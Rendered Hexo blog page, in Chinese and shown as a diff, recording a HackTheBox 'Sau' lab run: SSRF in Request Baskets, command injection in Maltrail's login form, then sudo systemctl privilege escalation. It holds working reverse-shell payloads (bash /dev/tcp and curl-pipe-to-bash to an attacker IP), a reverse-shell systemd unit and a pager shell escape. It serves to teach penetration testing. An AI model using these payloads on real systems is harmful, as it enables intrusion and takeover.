@@ -1,32 +1,429 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>hackthebox靶场Sau打靶记录 | Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="靶场hackthebox Sau，地址：https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Sau 此博客并非write up，只是记录以下我的打靶过程，也会有错误的操作，所以不建议不看内容，直接复制命令执行。但因为是记录过程，所以相关图文可能会更加详细，可能对你有所帮助。  一、前期探测 开启靶机，靶机ip：10.10.11.224     nmap端口发现： nmap -">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hackthebox靶场Sau打靶记录">
+<meta property="og:url" content="http://example.com/2023/09/12/007_machine_sau/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="靶场hackthebox Sau，地址：https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Sau 此博客并非write up，只是记录以下我的打靶过程，也会有错误的操作，所以不建议不看内容，直接复制命令执行。但因为是记录过程，所以相关图文可能会更加详细，可能对你有所帮助。  一、前期探测 开启靶机，靶机ip：10.10.11.224     nmap端口发现： nmap -">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2023-09-12T09:51:25.000Z">
+<meta property="article:modified_time" content="2023-09-13T04:58:49.096Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/09/12/007_machine_sau/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'hackthebox靶场Sau打靶记录',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-09-13 12:58:49'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-block content
-  #post
-    if top_img === false
-      include includes/header/post-info.pug
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-    article#article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
         
-    if theme.reward.enable && theme.reward.QR_code
-      !=partial('includes/post/reward', {}, {cache: true})
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Hexo"><span class="site-name">Hexo</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">hackthebox靶场Sau打靶记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-09-12T09:51:25.000Z" title="Created 2023-09-12 17:51:25">2023-09-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-09-13T04:58:49.096Z" title="Updated 2023-09-13 12:58:49">2023-09-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="hackthebox靶场Sau打靶记录"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><ul>
+<li>靶场hackthebox Sau，地址：<a target="_blank" rel="noopener" href="https://app.hackthebox.com/machines/Sau">https://app.hackthebox.com/machines/Sau</a></li>
+<li>此博客并非write up，只是记录以下我的打靶过程，也会有错误的操作，所以不建议不看内容，直接复制命令执行。但因为是记录过程，所以相关图文可能会更加详细，可能对你有所帮助。</li>
+</ul>
+<h1 id="一、前期探测"><a href="#一、前期探测" class="headerlink" title="一、前期探测"></a>一、前期探测</h1><ul>
+<li><p>开启靶机，靶机ip：10.10.11.224</p>
+<ul>
+<li><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307161827031.png" alt="image-20230716182715970"></li>
+</ul>
+</li>
+<li><p>nmap端口发现：<code> nmap -p- --min-rate 5000 10.10.11.224</code></p>
+<ul>
+<li><p>发现22，55555端口</p>
+</li>
+<li><p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307161833291.png" alt="image-20230716183302267"></p>
+</li>
+</ul>
+</li>
+<li><p>nmap针对扫描：<code>nmap -p 22,55555 -sC -sV --min-rate 5000 10.10.11.224</code></p>
+<ul>
+<li><p>22端口ssh服务。</p>
+</li>
+<li><p>55555端口，浏览器访问，发现是web服务。</p>
+</li>
+<li><p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307161837629.png" alt="image-20230716183704603"></p>
+</li>
+</ul>
+</li>
+<li><p>浏览器访问55555端口：</p>
+<ul>
+<li><p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307161904524.png" alt="image-20230716185725530"></p>
+</li>
+<li><p>界面显示Request Baskets，版本是1.2.1 。</p>
+<ul>
+<li>搜索发现Request Baskets是rbaskets开源的一个Web服务，用于收集任意 HTTP 请求并通过 RESTful API 或简单的 Web UI 检查它们。</li>
+<li><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307161916796.png" alt="image-20230716191618769"></li>
+</ul>
+</li>
+<li><p>同时发现漏洞<a target="_blank" rel="noopener" href="https://avd.aliyun.com/detail?id=AVD-2023-27163">https://avd.aliyun.com/detail?id=AVD-2023-27163</a></p>
+<ul>
+<li><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307161917373.png" alt="image-20230716191747345"></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="二、reques-baskets漏洞利用"><a href="#二、reques-baskets漏洞利用" class="headerlink" title="二、reques baskets漏洞利用"></a>二、reques baskets漏洞利用</h1><ul>
+<li><p>漏洞利用：<a target="_blank" rel="noopener" href="https://notes.sjtu.edu.cn/s/MUUhEymt7#">https://notes.sjtu.edu.cn/s/MUUhEymt7#</a></p>
+<ul>
+<li><p>request baskets服务存在api接口<code>/api/baskets/&#123;name&#125;</code>，<code>/baskets/&#123;name&#125;</code>，这里的name可以任意，这些接口会接收一个forward_url参数，而这个参数存在SSRF漏洞。</p>
+</li>
+<li><p>向<code>/api/baskets/&#123;name&#125;</code>发送forward_url参数后，需要访问<code>10.10.11.224:55555/&#123;name&#125;</code>来触发SSRF漏洞（请求给定的forward_url）。</p>
+</li>
+<li><p>可以实现55555端口访问其他端口内容的效果（如直接访问80端口被拦截，但是通过这个SSRF漏洞，让靶机主机访问80端口，再把内容显示在55555端口）。</p>
+</li>
+</ul>
+</li>
+<li><p>访问url：<code>/api/baskets/rktest</code>（rktest是随意取的），然后burp抓包，进行如下修改：</p>
+<ul>
+<li>GET改成POST，请求体内容为：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;forward_url&quot;: &quot;http://127.0.0.1:80/&quot;,</span><br><span class="line">  &quot;proxy_response&quot;: true,</span><br><span class="line">  &quot;insecure_tls&quot;: false,</span><br><span class="line">  &quot;expand_path&quot;: true,</span><br><span class="line">  &quot;capacity&quot;: 250</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .ads-wrap!=theme.ad.post
+<ul>
+<li>forward_url是请求的url，因为不知道80端口的网站具体有什么内容，所以是路径直接是&#x2F;。</li>
+<li>proxy_response设置为true，应该是控制是否将请求的url内容转发过来。</li>
+</ul>
+</li>
+<li><p>发送，返回token：iyU0YOQ2aZP9rqdWHqUusBbhxW9_1_Sh-AJQ0jyq03Dj</p>
+<ul>
+<li><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307180949036.png" alt="image-20230718094932963"></li>
+</ul>
+</li>
+<li><p>此时去访问：<code>10.10.11.224:55555/rktest</code>，显示了靶机80端口的网页：</p>
+<ul>
+<li><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307180954153.png" alt="image-20230718095444115"></li>
+<li><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307180955959.png" alt="image-20230718095501940"></li>
+<li>发现是Maltrail服务，还有版本号0.53，可以搜一下是什么，有什么漏洞</li>
+</ul>
+</li>
+<li><p>如果proxy_response设置为false，访问<code>10.10.11.224:55555/rktest_1</code>请求可以成功，但是没有内容：</p>
+<ul>
+<li><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307180958580.png" alt="image-20230718095822554"></li>
+<li>返回200，没有内容，只是执行了url请求。</li>
+</ul>
+</li>
+</ul>
+<h1 id="三、Maltrail漏洞利用："><a href="#三、Maltrail漏洞利用：" class="headerlink" title="三、Maltrail漏洞利用："></a>三、Maltrail漏洞利用：</h1><ul>
+<li><p>maltrail是开源的恶意流量检测系统，项目地址：<a target="_blank" rel="noopener" href="https://github.com/stamparm/maltrail%E3%80%82">https://github.com/stamparm/maltrail。</a></p>
+</li>
+<li><p>搜索maltrail vulnerability（中文可能没有），可以找到漏洞描述：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/">https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/</a></li>
+<li><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307181019096.png" alt="image-20230718101916071"></li>
+<li><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307181019148.png" alt="image-20230718101941128"></li>
+<li>在登入页面，请求体发送相应内容，可以执行系统命令，图片上执行id命令并将内容输出到&#x2F;tmp&#x2F;bbq。</li>
+<li>利用这个漏洞，或许可以反弹shell。</li>
+</ul>
+</li>
+<li><p>因为这个漏洞需要login页面，所以再次利用request baskets的ssrf漏洞</p>
+<ul>
+<li>forward_rul参数为<code>http://127.0.0.1:80/login</code></li>
+<li>对应的{name}需要修改，否则会显示重复</li>
+<li><pre><code>&#123;
+  &quot;forward_url&quot;: &quot;http://127.0.0.1:80/login&quot;,
+  &quot;proxy_response&quot;: true,
+  &quot;insecure_tls&quot;: false,
+  &quot;expand_path&quot;: true,
+  &quot;capacity&quot;: 250
+&#125;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    - 强烈建议复制一下数据包，保存起来，因为可能要反复使用两个数据包，修改比较麻烦。</span><br><span class="line">    </span><br><span class="line">    - 访问：`http://10.10.11.224:55555/rktest_2`，显示login failed，说明已经可以访问login页面了</span><br><span class="line">    - ![image-20230718102618788](https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307181026813.png)</span><br><span class="line"></span><br><span class="line"># 四、反弹shell：</span><br><span class="line"></span><br><span class="line">- nc监听12345端口：</span><br><span class="line"></span><br><span class="line">  - ![image-20230718103054468](https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307181114924.png)</span><br><span class="line"></span><br><span class="line">- burp抓取`http://10.10.11.224:55555/rktest_2`，数据包，指定请求体：</span><br><span class="line"></span><br><span class="line">  - ```shell</span><br><span class="line">      username=;`bash -i &gt;&amp; /dev/tcp/10.10.14.15/12345 0&gt;&amp;1`  #ip,端口自己指定</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p>为了服务器识别，进行了url编码，同时请求头加上<code>Content-Type: application/x-www-form-urlencoded</code></p>
+<ul>
+<li><pre><code class="shell">username=%3b%60bash+-i+%3e%26+%2fdev%2ftcp%2f10.10.14.15%2f12345+0%3e%261%60
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    - ![image-20230718110407083](https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307181114759.png)</span><br><span class="line"></span><br><span class="line">    - 建议保存上面的数据包。</span><br><span class="line"></span><br><span class="line">  - username尝试了多种格式，发现都不能接收到shell，放弃直接bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- 尝试执行curl指令，执行sh脚本，反弹shell：</span><br><span class="line"></span><br><span class="line">  - shell.sh：修改ip和port</span><br><span class="line"></span><br><span class="line">  -  ![image-20230718132425257](https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307181324275.png)</span><br><span class="line"></span><br><span class="line">  - 开启http服务：python3 -m http.server 80，当前目录就是web根目录</span><br><span class="line"></span><br><span class="line">  - ![image-20230718131920078](https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307181319108.png)</span><br><span class="line"></span><br><span class="line">  - ```shell</span><br><span class="line">    username=;`curl 10.10.14.15/shell.sh|bash`			 #</span><br><span class="line">    username=%3b%60curl+10.10.14.15%2fshell.sh%7cbash%60 #url编码</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p>成功反弹shell：http服务器检测到流量，nc得到shell</p>
+</li>
+<li><p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307181328263.png" alt="image-20230718132849234"></p>
+</li>
+<li><p>user flag：</p>
+<ul>
+<li>puma家目录：9d27f073a1321690ac3a83a5ffc270db</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307181345933.png" alt="image-20230718134523914"></p>
+</li>
+</ul>
+<h1 id="五、权限提升："><a href="#五、权限提升：" class="headerlink" title="五、权限提升："></a>五、权限提升：</h1><ul>
+<li><p>首先考虑信息泄露，查看maltrail配置文件，cat maltrail.conf</p>
+<ul>
+<li><p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307181342227.png" alt="image-20230718134253199"></p>
+</li>
+<li><pre><code># User entries (username:sha256(password):UID:filter_netmask(s))
+#filter_netmask(s) is/are used to filter results
+USERS
+    admin:9ab3cd9d67bf49d01f6a2e33d0bd9bc804ddbe6ce1ff5d219c42624851db5dbc:0:           #changeme!
+#   local:9ab3cd9d67bf49d01f6a2e33d0bd9bc804ddbe6ce1ff5d219c42624851db5dbc:1000:192.168.0.0/16      # changeme!
 
-    if theme.post_pagination
-      include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">  - 获得一段sha256加密的密码，尝试破解（https://www.somd5.com/），发现就是maltrail的默认密码changeme!</span><br><span class="line"></span><br><span class="line">  - ![image-20230718135213954](https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307181352984.png)</span><br><span class="line"></span><br><span class="line">  - 如果这样，不太可能是root或者puma用户的密码。</span><br><span class="line"></span><br><span class="line">  - 再检索了其他文件，没有什么发现。</span><br><span class="line"></span><br><span class="line">- id查看用户组：![image-20230719085657219](https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307190857278.png)</span><br><span class="line"></span><br><span class="line">- 查看是否有什么可执行文件，find / -group puma，发现都是一些进程，或者没有权限。</span><br><span class="line"></span><br><span class="line">- 尝试sudo -l，发现居然不需要密码（一般都是需要密码，不知道为什么这里不需要？），发现可以不要密码的运行systemctl：</span><br><span class="line"></span><br><span class="line">  - ![image-20230719090417632](https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307190904670.png)</span><br><span class="line">  - ![image-20230719090611494](https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307190906516.png)</span><br><span class="line"></span><br><span class="line">- systemctl提权，反弹root权限的shell：</span><br><span class="line"></span><br><span class="line">  - 网上搜了下sudo systemctl提权，发现方法：https://www.cnblogs.com/zlgxzswjy/p/14781471.html</span><br><span class="line"></span><br><span class="line">  - 进入/dev/shm目录，创建文件mm.service，内容如下(**ip，端口需要修改**)：</span><br><span class="line"></span><br><span class="line">    - ```shell</span><br><span class="line">      [Service]</span><br><span class="line">      Type=oneshot</span><br><span class="line">      ExecStart=/bin/bash -c &quot;/bin/bash -i &gt; /dev/tcp/10.10.14.15/23456 0&gt;&amp;1 2&lt;&amp;1&quot;</span><br><span class="line">      [Install]</span><br><span class="line">      WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
 
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache: true})
-      
+- 多行写入指令：cat &gt;&gt;mm.service&lt;&lt;EOF
+
+- ![image-20230719092025896](https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307190920927.png)
+
+- 查看写入是否正常：cat mm.service
+
+- ![image-20230719092111646](https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307190921672.png)
+</code></pre>
+</li>
+<li><p>nc监听端口23456：nc -lvvp 23456</p>
+</li>
+<li><p>启动服务：</p>
+<ul>
+<li><p>sudo systemctl link &#x2F;dev&#x2F;shm&#x2F;mm.service，</p>
+</li>
+<li><p>sudo systemctl enable –now &#x2F;dev&#x2F;shm&#x2F;mm.service\</p>
+</li>
+<li><p>执行发现需要terminal：<strong>sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper</strong>，需要交互式shell来输入密码，但是sudo -l不用密码也可以，不知道为啥。</p>
+</li>
+<li><p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307190929042.png" alt="image-20230719092956021"></p>
+</li>
+<li><p>使用python获取交互式shell：<code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+</li>
+<li><p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307190929705.png" alt="image-20230719092929680"></p>
+</li>
+<li><p>这时候sudo systemctl又需要密码了，说好的NOPASSWD呢？？？？</p>
+</li>
+<li><p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307190933572.png" alt="image-20230719093304547"></p>
+</li>
+</ul>
+</li>
+<li><p>再次看了下sudo -l，发现应该限制了服务名称trail.service</p>
+<ul>
+<li><p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307190943390.png" alt="image-20230719094309368"></p>
+</li>
+<li><p>将mm.service修改了名字，再尝试发现还是不行：</p>
+</li>
+<li><p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307190958482.png" alt="image-20230719095829450"></p>
+</li>
+</ul>
+</li>
+<li><p>尝试运行以下sudo systemctl status trail.service：</p>
+<ul>
+<li><p>发现确实可以不要密码运行，难道限制了指令只能status，trail.service的具体路径也限制了吗？</p>
+</li>
+<li><p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307191000457.png" alt="image-20230719100044420"></p>
+</li>
+<li><p>Loaded: loaded (&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;trail.service; enabled; vendor preset:&gt;</p>
+</li>
+<li><p>考虑修改原来的trail.service，发现权限不够：</p>
+</li>
+<li><p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307191005841.png" alt="image-20230719100507812"></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>再次去搜索systemctl提权的方法，原来是中文搜索，只能看到一篇提及systemctl提权的博客，这次英文搜索<code>linux &quot;systemctl&quot; &quot;escalate&quot;</code>，发现：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/systemctl/%EF%BC%8C%E8%BF%99%E9%87%8C%E6%8F%90%E5%8F%8A%E4%BA%86%E4%B8%80%E4%B8%AAsudo%E6%8F%90%E6%9D%83%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%9A">https://gtfobins.github.io/gtfobins/systemctl/，这里提及了一个sudo提权的方法：</a></p>
+<ul>
+<li><p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307191009547.png" alt="image-20230719100928522"></p>
+</li>
+<li><p>直接sudo运行systemctl运行后，输入!sh</p>
+</li>
+<li><p>sudo systemctl status trail.service，显示一段内容后，会暂停让我们输入，直接输入!sh</p>
+</li>
+<li><p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307191011551.png" alt="image-20230719101141515"></p>
+</li>
+<li><p>提权成功！</p>
+</li>
+<li><p>flag在&#x2F;root目录：2c4fa5feb2d7bd0f4d5ca9c23834bddb</p>
+</li>
+<li><p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202307191014998.png" alt="image-20230719101412968"></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="六、总结："><a href="#六、总结：" class="headerlink" title="六、总结："></a>六、总结：</h1><ul>
+<li>request baskets漏洞，CVE-2023-27163，SSRF漏洞，访问外网无法访问的80端口网站。</li>
+<li>maltrail漏洞，远程命令执行，反弹shell。</li>
+<li>systemctl sudo提权，可以无密码sudo systemctl status 某个服务，运行后，输入!sh提权。</li>
+</ul>
+<h1 id="七、参考："><a href="#七、参考：" class="headerlink" title="七、参考："></a>七、参考：</h1><ul>
+<li><p>sau write up：<a target="_blank" rel="noopener" href="https://techyrick.com/sau-htb-writeup/">https://techyrick.com/sau-htb-writeup/</a></p>
+</li>
+<li><p>request baskets漏洞描述：<a target="_blank" rel="noopener" href="https://avd.aliyun.com/detail?id=AVD-2023-27163">https://avd.aliyun.com/detail?id=AVD-2023-27163</a></p>
+</li>
+<li><p>request baskets漏洞利用：<a target="_blank" rel="noopener" href="https://notes.sjtu.edu.cn/s/MUUhEymt7#">https://notes.sjtu.edu.cn/s/MUUhEymt7#</a></p>
+</li>
+<li><p>maltrail漏洞利用：<a target="_blank" rel="noopener" href="https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/">https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/</a></p>
+</li>
+<li><p>systemctl提权：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zlgxzswjy/p/14781471.html">https://www.cnblogs.com/zlgxzswjy/p/14781471.html</a></p>
+</li>
+<li><p>systemctl提权：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/systemctl/">https://gtfobins.github.io/gtfobins/systemctl/</a></p>
+</li>
+<li><p>SSRF连接login页面数据报：</p>
+</li>
+<li><pre><code class="http">POST /api/baskets/rktest HTTP/1.1
+Host: 10.10.11.224:55555
